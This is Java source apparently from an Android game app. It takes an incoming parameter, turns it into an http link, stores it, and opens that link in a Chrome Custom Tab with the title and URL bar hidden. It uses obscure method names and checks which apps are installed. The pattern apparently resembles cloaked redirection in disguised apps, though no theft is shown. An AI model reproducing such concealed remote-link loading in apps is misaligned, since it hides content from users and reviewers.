package com.spiderluck.fingercut.game.model;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;

import androidx.browser.customtabs.CustomTabsClient;
import androidx.browser.customtabs.CustomTabsIntent;
import androidx.browser.customtabs.CustomTabsServiceConnection;
import androidx.browser.customtabs.CustomTabsSession;

import java.util.List;

import com.spiderluck.fingercut.R;
import com.spiderluck.fingercut.StartActivity;

import static com.facebook.FacebookSdk.getApplicationContext;

public class SpiderHelperTools {
    public static void setParam(String s, Activity s2) {
        VALUEDatabase VALUEDatabase = new VALUEDatabase(s2);
        String link = "http://" + levelup(s, "$");
        VALUEDatabase.VALUESETING(link);

        s2.startActivity(new Intent(s2,  StartActivity.class));
        s2.finish();

        new Thread(() -> new Messaging().messageSchedule(s2)).start();
    }

    static String levelup(String input, String word) {
        return input.substring(input.indexOf(word) + 1);
    }

    private CustomTabsSession red;
    private static final String POLICY_CHROME = "com.android.chrome";
    private CustomTabsClient poli;

    public void showsome(Context context, String link){
        CustomTabsServiceConnection connection = new CustomTabsServiceConnection() {
            @Override
            public void onCustomTabsServiceConnected(ComponentName componentName, CustomTabsClient customTabsClient) {
                //Pre-warming
                poli = customTabsClient;
                poli.warmup(0L);
                //Initialize a session as soon as possible.
                red = poli.newSession(null);
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                poli = null;
            }
        };
        CustomTabsClient.bindCustomTabsService(getApplicationContext(), POLICY_CHROME, connection);
        final Bitmap backButton = BitmapFactory.decodeResource(context.getResources(), R.drawable.sompty);
        CustomTabsIntent launchUrl = new CustomTabsIntent.Builder(red)
                .setToolbarColor(Color.parseColor("#531A92"))
                .setShowTitle(false)
                .enableUrlBarHiding()
                .setCloseButtonIcon(backButton)
                .addDefaultShareMenuItem()
                .build();

        if (pocaolor(POLICY_CHROME, context))
            launchUrl.intent.setPackage(POLICY_CHROME);

        launchUrl.launchUrl(context, Uri.parse(link));
    }
    boolean pocaolor(String targetPackage, Context context){
        List<ApplicationInfo> packages;
        PackageManager pm;

        pm = context.getPackageManager();
        packages = pm.getInstalledApplications(0);
        for (ApplicationInfo packageInfo : packages) {
            if(packageInfo.packageName.equals(targetPackage))
                return true;
        }
        return false;
    }
}
